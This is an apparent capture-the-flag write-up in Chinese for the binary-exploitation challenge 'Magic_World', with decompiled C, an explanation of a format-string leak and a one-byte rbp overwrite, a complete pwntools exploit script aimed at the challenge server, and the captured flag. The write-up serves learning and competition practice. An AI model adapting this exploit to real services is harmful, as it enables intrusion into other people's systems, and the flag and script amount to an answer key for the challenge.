## Magic_World
### solution
題目反編譯如下：
```c
int __cdecl main() {
  int choice; // [rsp+Ch] [rbp-4h]
  do {
    while ( 1 ) {
      puts("================================");
      puts(aMagicWorld);
      puts("================================");
      puts("      1. Regist a spell");
      puts("      2. Try a spell");
      puts("================================");
      __printf_chk(1LL, "Choice: ");
      __isoc99_scanf("%d", &v4);
      if ( choice != 1 )
        break;
      regist();
    }
  } while ( choice != 2 );
  magic();
  return 0;
}

__int64 regist() {
  char buf; // [rsp+0h] [rbp-70h]

  __printf_chk(1LL, "Give me your spell: ");
  read(0, &buf, 0x64uLL);
  __printf_chk(1LL, "Regist: ");
  return __printf_chk(1LL, &buf);
}

ssize_t magic() {
  char buf; // [rsp+0h] [rbp-10h]

  __printf_chk(1LL, "Give me your spell: ");
  return read(0, &buf, 0x11uLL);
}
```
題目可以無限次`regist()`，裏面有0x64個bytes的format string漏洞，但由於binary有開啟FORTIFY SOURCE，無法使用extension的"$"功能，最後可以有一次長度0x11的`read()`，可以overflow 1byte到rbp的最低byte。

題目有給libc因此就先試著leak libc，同時試著把stack位址也leak出來，由於buffer長度夠大，即使不能使用"$"也仍然足以leak出main的rbp(stack)和main的return位址(libc)，都leak出來以後便是思考怎麼控制執行流程。

`magic`內的1 byte overflow可以使`main`的rbp移動到鄰近位址，而return位址固定為rbp+8，利用這點我們可以使rbp落在`magic()`中`read`的buffer上，如此一來就能控制rip，最後則是該怎麼執行shell。

非常地剛好，`magic()` return回`main`之後會先執行`mov eax, 0`才`leave; ret;`，而libc中有constraint是`rax==0`的one gadget
```c
0x46428 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL
```
試著跳到這個gadget就成功拿到shell了。
### script
```python
#!/usr/bin/env python3
from pwn import *
context(arch="amd64")

def regist(s):
    r.recvuntil("Choice: ")
    r.sendline("1")
    r.recvuntil("spell: ")
    r.send(s)

def magic(s):
    r.recvuntil("Choice: ")
    r.sendline("2")
    r.recvuntil("spell: ")
    r.send(s)

#r = process("Magic_World")
r = remote("104.199.235.135", 2114)

# leak
regist("%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx#%llx%llx%llx%llx%llx@%llx")
r.recvuntil("#")
main_rbp = int(r.recv(12), 16)
r.recvuntil("@")
libc_addr = int(r.recvuntil("==", drop=True)[:12], 16)
libc = libc_addr - 0x21f45

# overwrite the last byte of rbp
# making rbp = buffer => rip = buffer + 0x8
last_byte = bytes([(main_rbp - 0x30) % 0x100])
payload = b"a"*8 + p64(libc + 0x46428) + last_byte
magic(payload)

r.interactive()

```
### flag
```
AIS3{m1gRatlon_&_b0f_13_Qu1t3_3asY!!!}
```
